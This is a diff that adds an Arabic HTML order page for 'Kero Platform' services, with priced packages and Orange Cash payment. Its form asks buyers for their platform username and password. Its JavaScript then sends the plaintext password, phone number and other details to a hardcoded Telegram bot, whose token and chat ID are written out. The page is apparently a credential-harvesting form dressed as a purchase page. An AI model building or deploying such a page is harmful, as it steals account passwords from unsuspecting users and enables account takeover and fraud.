@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kero Platform | خدمات منصة كيرو</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        :root {
+            --primary: #7e57c2;
+            --secondary: #5e35b1;
+            --success: #00c853;
+            --dark: #1a237e;
+            --light: #f3e5f5;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            overflow: hidden;
+            border: 3px solid var(--light);
+        }
+
+        .header {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+            position: relative;
+        }
+
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 0;
+            right: 0;
+            height: 20px;
+            background: white;
+            border-radius: 20px 20px 0 0;
+        }
+
+        .logo {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .header h1 {
+            font-size: 1.8rem;
+            margin-bottom: 5px;
+            font-weight: 700;
+        }
+
+        .content {
+            padding: 40px 25px 25px;
+        }
+
+        /* Packages */
+        .package {
+            background: white;
+            border: 2px solid #e5e7eb;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .package::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: transparent;
+            transition: all 0.3s ease;
+        }
+
+        .package:hover::before {
+            background: var(--primary);
+        }
+
+        .package:hover {
+            border-color: var(--primary);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(126, 87, 194, 0.2);
+        }
+
+        .package.selected {
+            border-color: var(--primary);
+            background: linear-gradient(135deg, #f3e5f5 0%, #ede7f6 100%);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(126, 87, 194, 0.3);
+        }
+
+        .package.selected::before {
+            background: var(--primary);
+        }
+
+        .package-title {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--dark);
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .package-details {
+            color: #6b7280;
+            margin-bottom: 10px;
+            font-size: 0.9rem;
+        }
+
+        .package-price {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--primary);
+            text-align: left;
+        }
+
+        /* Forms */
+        .form-section {
+            display: none;
+        }
+
+        .form-section.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-title {
+            font-size: 1.4rem;
+            color: var(--dark);
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--dark);
+            font-weight: 600;
+            font-size: 0.95rem;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            background: white;
+        }
+
+        .form-input:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(126, 87, 194, 0.1);
+            background: #fafafa;
+        }
+
+        .form-input.small {
+            max-width: 100px;
+            text-align: center;
+            font-size: 1.2rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+
+        .form-hint {
+            font-size: 0.85rem;
+            color: #6b7280;
+            margin-top: 5px;
+        }
+
+        /* Payment Info */
+        .payment-info {
+            background: linear-gradient(135deg, #e8f5e8 0%, #f1f8e9 100%);
+            border: 2px solid #c8e6c9;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 25px 0;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .payment-info::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: var(--success);
+        }
+
+        .payment-title {
+            font-size: 1.1rem;
+            color: var(--dark);
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+
+        .payment-number {
+            font-size: 1.4rem;
+            color: var(--primary);
+            font-weight: 700;
+            margin: 10px 0;
+            direction: ltr;
+            display: inline-block;
+            background: white;
+            padding: 8px 15px;
+            border-radius: 8px;
+            border: 1px solid #e5e7eb;
+        }
+
+        .payment-note {
+            color: #6b7280;
+            font-size: 0.9rem;
+            margin-top: 10px;
+        }
+
+        /* Buttons */
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(126, 87, 194, 0.4);
+        }
+
+        .btn-secondary {
+            background: #6b7280;
+            color: white;
+        }
+
+        .btn-secondary:hover {
+            background: #4b5563;
+        }
+
+        .btn-whatsapp {
+            background: #25d366;
+            color: white;
+            text-decoration: none;
+            margin-top: 15px;
+        }
+
+        .btn-whatsapp:hover {
+            background: #128c7e;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(37, 211, 102, 0.4);
+        }
+
+        /* Success Section */
+        .success-section {
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .success-icon {
+            font-size: 4rem;
+            color: var(--success);
+            margin-bottom: 20px;
+            animation: bounce 1s ease;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            60% { transform: translateY(-5px); }
+        }
+
+        .success-title {
+            font-size: 1.8rem;
+            color: var(--dark);
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+
+        .success-message {
+            color: #6b7280;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .content {
+                padding: 30px 15px 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-laptop-code"></i>
+            </div>
+            <h1>منصة كيرو</h1>
+            <p>Kero Platform Services</p>
+        </div>
+
+        <!-- Content -->
+        <div class="content">
+            <!-- Package Selection -->
+            <div class="form-section active" id="packageSection">
+                <h2 class="form-title">اختر الباقة المناسبة</h2>
+                
+                <div class="package" onclick="selectPackage('economy')">
+                    <div class="package-title">
+                        <i class="fas fa-leaf" style="color: #4caf50;"></i> الباقة الاقتصادية
+                    </div>
+                    <div class="package-details">١-٢ كيرو | حلول أساسية</div>
+                    <div class="package-price">١٠ جنيه</div>
+                </div>
+                
+                <div class="package" onclick="selectPackage('medium')">
+                    <div class="package-title">
+                        <i class="fas fa-star" style="color: #ff9800;"></i> الباقة المتوسطة
+                    </div>
+                    <div class="package-details">٣-١٠ كيرو | حلول متقدمة</div>
+                    <div class="package-price">٥٠ جنيه</div>
+                </div>
+                
+                <div class="package" onclick="selectPackage('premium')">
+                    <div class="package-title">
+                        <i class="fas fa-crown" style="color: #ffd700;"></i> الباقة المميزة
+                    </div>
+                    <div class="package-details">١١-٢٠ كيرو | حلول شاملة</div>
+                    <div class="package-price">١٠٠ جنيه</div>
+                </div>
+            </div>
+
+            <!-- Data Form -->
+            <div class="form-section" id="dataForm">
+                <h2 class="form-title">معلومات الطلب</h2>
+                
+                <div class="payment-info">
+                    <div class="payment-title">
+                        <i class="fas fa-mobile-alt"></i> رقم أورانج كاش
+                    </div>
+                    <div class="payment-number">01121018575</div>
+                    <div class="payment-note">سيتم تأكيد الطلب فور التحويل</div>
+                </div>
+
+                <!-- التعديل هنا: اسم المستخدم بدل الاسم الكامل -->
+                <div class="form-group">
+                    <label class="form-label" for="userName">
+                        <i class="fas fa-user-circle"></i> اسم المستخدم الخاص بالمنصة
+                    </label>
+                    <input type="text" id="userName" class="form-input" placeholder="أدخل اسم المستخدم الخاص بك في المنصة" required>
+                    <div class="form-hint">اسم المستخدم الذي تستخدمه لتسجيل الدخول لمنصة كيرو</div>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" for="platformPassword">
+                        <i class="fas fa-lock"></i> كلمة سر منصة كيرو
+                    </label>
+                    <input type="password" id="platformPassword" class="form-input" placeholder="أدخل كلمة السر" required>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" for="phoneNumber">
+                        <i class="fas fa-phone"></i> رقم الهاتف
+                    </label>
+                    <input type="tel" id="phoneNumber" class="form-input" placeholder="أدخل رقم الهاتف" required>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" for="lastTwoDigits">
+                        <i class="fas fa-hashtag"></i> آخر رقمين من الرقم المحول منه
+                    </label>
+                    <input type="text" id="lastTwoDigits" class="form-input small" placeholder="75" maxlength="2" 
+                           pattern="[0-9]{2}" required oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                    <div class="form-hint">أدخل آخر رقمين فقط من الرقم الذي حولت منه</div>
+                </div>
+                
+                <button class="btn btn-primary" onclick="submitOrder()">
+                    <i class="fas fa-paper-plane"></i> تأكيد الطلب وإرسال البيانات
+                </button>
+                <button class="btn btn-secondary" onclick="backToPackages()" style="margin-top: 10px;">
+                    <i class="fas fa-arrow-right"></i> الرجوع لاختيار الباقة
+                </button>
+            </div>
+
+            <!-- Confirmation -->
+            <div class="form-section" id="confirmation">
+                <div class="success-section">
+                    <div class="success-icon">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <h2 class="success-title">تم استلام طلبك بنجاح!</h2>
+                    <p class="success-message">
+                        تم إرسال بيانات طلبك بنجاح وسيتم التواصل معك خلال ٢٤ ساعة
+                    </p>
+                    
+                    <div class="payment-info">
+                        <div class="payment-title">
+                            <i class="fas fa-mobile-alt"></i> رقم أورانج كاش
+                        </div>
+                        <div class="payment-number">01121018575</div>
+                        <div class="payment-note">يرجى إتمام التحويل ثم إرسال صورة الإيصال</div>
+                    </div>
+                    
+                    <a href="https://wa.me/201121018575" 
+                       class="btn btn-whatsapp" target="_blank">
+                       <i class="fab fa-whatsapp"></i> إرسال الإيصال على الواتساب
+                    </a>
+                    
+                    <button class="btn btn-primary" onclick="newOrder()" style="margin-top: 15px;">
+                        <i class="fas fa-plus"></i> طلب جديد
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // البيانات
+        const packages = {
+            economy: { 
+                name: 'الباقة الاقتصادية', 
+                price: '١٠ جنيه', 
+                range: '١-٢ كيرو'
+            },
+            medium: { 
+                name: 'الباقة المتوسطة', 
+                price: '٥٠ جنيه', 
+                range: '٣-١٠ كيرو'
+            },
+            premium: { 
+                name: 'الباقة المميزة', 
+                price: '١٠٠ جنيه', 
+                range: '١١-٢٠ كيرو'
+            }
+        };
+
+        let selectedPackage = '';
+
+        // اختيار الباقة
+        function selectPackage(packageType) {
+            selectedPackage = packageType;
+            
+            // إزالة التحديد من جميع الباقات
+            document.querySelectorAll('.package').forEach(pkg => {
+                pkg.classList.remove('selected');
+            });
+            
+            // إضافة التحديد للباقة المختارة
+            event.currentTarget.classList.add('selected');
+            
+            // الانتقال للنموذج
+            document.getElementById('packageSection').classList.remove('active');
+            document.getElementById('dataForm').classList.add('active');
+        }
+        
+        // الرجوع لاختيار الباقة
+        function backToPackages() {
+            document.getElementById('dataForm').classList.remove('active');
+            document.getElementById('packageSection').classList.add('active');
+        }
+        
+        // إرسال الطلب
+        function submitOrder() {
+            const userName = document.getElementById('userName').value.trim();
+            const password = document.getElementById('platformPassword').value.trim();
+            const phone = document.getElementById('phoneNumber').value.trim();
+            const lastTwoDigits = document.getElementById('lastTwoDigits').value.trim();
+            
+            if (!userName || !password || !phone || !lastTwoDigits) {
+                alert('⚠️ من فضلك املأ جميع البيانات المطلوبة');
+                return;
+            }
+            
+            if (lastTwoDigits.length !== 2 || !/^\d+$/.test(lastTwoDigits)) {
+                alert('⚠️ من فضلك أدخل آخر رقمين فقط (رقمين فقط)');
+                return;
+            }
+            
+            // إرسال البيانات للتليجرام
+            const message = `🛎 طلب جديد من موقع كيرو!\n\n👤 اسم المستخدم: ${userName}\n📱 الهاتف: ${phone}\n🔐 كلمة السر: ${password}\n📦 الباقة: ${packages[selectedPackage].name}\n💵 السعر: ${packages[selectedPackage].price}\n🔢 آخر رقمين: ${lastTwoDigits}\n\n💳 رقم التحويل: 01121018575`;
+            
+            const botToken = '6506189895:AAEwRi0WpBXi3pQ91MAkz8JcsS64v6R5voE';
+            const chatId = '6895524607';
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            }).then(response => {
+                if (response.ok) {
+                    // الانتقال لشاشة التأكيد
+                    document.getElementById('dataForm').classList.remove('active');
+                    document.getElementById('confirmation').classList.add('active');
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+                alert('⚠️ حدث خطأ في الإرسال، يرجى المحاولة مرة أخرى');
+            });
+        }
+        
+        // طلب جديد
+        function newOrder() {
+            document.getElementById('confirmation').classList.remove('active');
+            document.getElementById('packageSection').classList.add('active');
+            selectedPackage = '';
+            
+            // إزالة التحديد من الباقات
+            document.querySelectorAll('.package').forEach(pkg => {
+                pkg.classList.remove('selected');
+            });
+            
+            // تفريغ النموذج
+            document.getElementById('userName').value = '';
+            document.getElementById('platformPassword').value = '';
+            document.getElementById('phoneNumber').value = '';
+            document.getElementById('lastTwoDigits').value = '';
+        }
+    </script>
+</body>
+</html>
